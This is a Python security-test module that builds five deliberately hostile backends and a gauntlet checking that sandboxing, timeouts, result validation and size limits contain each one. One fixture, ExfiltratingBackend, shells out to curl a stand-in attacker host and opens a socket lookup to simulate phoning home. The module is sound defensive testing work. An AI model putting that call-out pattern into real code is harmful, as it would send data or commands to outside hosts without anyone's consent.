"""Malicious-backend adversarial fixtures + containment gauntlet.
# secscan: hostile-fixture — this module is deliberately hostile code.

Slice 415. Five hostile backends, each defeated by a real,
already-implemented layer (threat T-11):

- :class:`LyingBackend` — out-of-spec values, impossible
  confidence → :func:`validate_result` rejects (SpecError).
- :class:`ExfiltratingBackend` — socket/subprocess during
  evaluate → :class:`SandboxedBackend` (slice 408) raises
  SandboxViolation before the operation runs.
- :class:`HangingBackend` — sleeps forever → :class:`TimeoutBackend`
  raises TimeoutError past the deadline.
- :class:`GiantOutputBackend` — megabyte metadata blob →
  output-size check raises InputTooLarge.
- :class:`ExplodingBackend` — raises arbitrary exceptions →
  core translates to BackendError (never a raw traceback leak).

:func:`run_gauntlet` executes each attack against a live
:class:`HugrGate` and reports per-attack containment; the
control backend must still decide normally.
"""

from __future__ import annotations

import json
import os
import socket
import time
from collections.abc import Mapping
from dataclasses import dataclass, field
from typing import Any

from hugrgate.backend import Backend
from hugrgate.errors import (
    BackendError,
    InputTooLarge,
    SandboxViolation,
    SpecError,
    TimeoutError,
)
from hugrgate.result import DecisionResult
from hugrgate.security.sandbox import SandboxedBackend, SandboxPolicy
from hugrgate.spec import DecisionSpec
from hugrgate.timeout import TimeoutBackend
from hugrgate.validation import validate_result

__all__ = [
    "MAX_RESULT_BYTES",
    "ExfiltratingBackend",
    "ExplodingBackend",
    "GauntletReport",
    "GiantOutputBackend",
    "HangingBackend",
    "LyingBackend",
    "check_result_size",
    "run_gauntlet",
]

#: Output-size cap for one decision result (metadata included).
MAX_RESULT_BYTES = 1_000_000


def check_result_size(result: DecisionResult,
                      max_bytes: int = MAX_RESULT_BYTES) -> int:
    """Reject oversized results; returns the measured size."""
    payload = json.dumps({
        "value": result.value,
        "probability": result.probability,
        "metadata": result.metadata,
    }, default=str)
    size = len(payload.encode("utf-8"))
    if size > max_bytes:
        raise InputTooLarge(
            f"result exceeds {max_bytes} bytes: {size}",
            limit="max_result_bytes", actual=size, allowed=max_bytes)
    return size


class _Base(Backend):
    name = "malicious"

    def capabilities(self) -> dict[str, Any]:
        return {}

    def supports(self, spec: DecisionSpec) -> bool:
        return True


class LyingBackend(_Base):
    """Returns values outside the spec's decision space."""

    name = "lying"

    def evaluate(self, state: Mapping[str, Any], spec: DecisionSpec,
                 context: Mapping[str, Any] | None = None
                 ) -> DecisionResult:
        return DecisionResult(value="not-an-option", probability=1.0,
                              backend=self.name, model="lying")


class ExfiltratingBackend(_Base):
    """Tries to phone home and run commands during evaluate()."""

    name = "exfiltrating"

    def evaluate(self, state: Mapping[str, Any], spec: DecisionSpec,
                 context: Mapping[str, Any] | None = None
                 ) -> DecisionResult:
        socket.getaddrinfo("evil.example.com", 443)
        os.system("curl evil.example.com")
        return DecisionResult(value="yes", probability=1.0,
                              backend=self.name, model="exfil")


class HangingBackend(_Base):
    """Never returns."""

    name = "hanging"

    def evaluate(self, state: Mapping[str, Any], spec: DecisionSpec,
                 context: Mapping[str, Any] | None = None
                 ) -> DecisionResult:
        time.sleep(3600)
        return DecisionResult(value="yes", probability=1.0,
                              backend=self.name, model="hanging")


class GiantOutputBackend(_Base):
    """Returns a legitimate value with a megabyte metadata blob."""

    name = "giant"

    def evaluate(self, state: Mapping[str, Any], spec: DecisionSpec,
                 context: Mapping[str, Any] | None = None
                 ) -> DecisionResult:
        return DecisionResult(
            value="yes", probability=0.9, backend=self.name,
            model="giant", metadata={"blob": "x" * (2 * MAX_RESULT_BYTES)})


class ExplodingBackend(_Base):
    """Raises non-taxonomy exceptions."""

    name = "exploding"

    def evaluate(self, state: Mapping[str, Any], spec: DecisionSpec,
                 context: Mapping[str, Any] | None = None
                 ) -> DecisionResult:
        raise RuntimeError("boom")


class HonestBackend(_Base):
    """Control: a well-behaved backend."""

    name = "honest"

    def evaluate(self, state: Mapping[str, Any], spec: DecisionSpec,
                 context: Mapping[str, Any] | None = None
                 ) -> DecisionResult:
        return DecisionResult(value="yes", probability=0.9,
                              backend=self.name, model="honest")


@dataclass
class GauntletReport:
    contained: dict[str, str] = field(default_factory=dict)
    escaped: list[str] = field(default_factory=list)
    control_ok: bool = False

    @property
    def passed(self) -> bool:
        return not self.escaped and self.control_ok

    def to_dict(self) -> dict[str, Any]:
        return {
            "passed": self.passed,
            "contained": dict(self.contained),
            "escaped": list(self.escaped),
            "control_ok": self.control_ok,
        }


def _spec() -> DecisionSpec:
    return DecisionSpec(type="categorical", options=["yes", "no"])


def run_gauntlet() -> GauntletReport:
    """Run every attack; each must be contained, control must pass."""
    # Imported lazily: this module loads during ``hugrgate`` package
    # init (via the privacy_crypto -> security chain), when the
    # top-level package is still partially initialized. Imported
    # from defining modules, not the package root (boundary rule).
    from hugrgate.core import HugrGate
    from hugrgate.policy import DecisionPolicy

    report = GauntletReport()
    state = {"x": 1}
    spec = _spec()

    def contain(name: str, fn: Any, expect: type[BaseException]) -> None:
        try:
            fn()
        except expect as e:
            report.contained[name] = type(e).__name__
        except Exception as e:  # noqa: BLE001 - the gauntlet records escapes
            report.escaped.append(
                f"{name}: escaped as {type(e).__name__}: {e}")
        else:
            report.escaped.append(f"{name}: no error raised")

    # 1. Lying: out-of-spec value rejected by result validation.
    def lying() -> None:
        validate_result(LyingBackend().evaluate(state, spec), spec)
    contain("lying", lying, SpecError)

    # 2. Exfiltrating: sandbox blocks before the socket opens.
    def exfil() -> None:
        SandboxedBackend(ExfiltratingBackend(),
                         SandboxPolicy()).evaluate(state, spec)
    contain("exfiltrating", exfil, SandboxViolation)

    # 3. Hanging: deadline fires.
    def hanging() -> None:
        TimeoutBackend(HangingBackend(),
                       explicit_deadline_ms=200).evaluate(state, spec)
    contain("hanging", hanging, TimeoutError)

    # 4. Giant output: size check rejects.
    def giant() -> None:
        check_result_size(GiantOutputBackend().evaluate(state, spec),
                          max_bytes=1024)
    contain("giant_output", giant, InputTooLarge)

    # 5. Exploding: core translates to BackendError through decide().
    def exploding() -> None:
        gate = HugrGate()
        gate.register(ExplodingBackend())
        gate.decide(state, spec, DecisionPolicy(), backend_name="exploding")
    contain("exploding", exploding, BackendError)

    # Control: honest backend decides end to end.
    gate = HugrGate()
    gate.register(HonestBackend())
    result = gate.decide(state, spec, DecisionPolicy(),
                         backend_name="honest")
    report.control_ok = result.value == "yes"

    return report
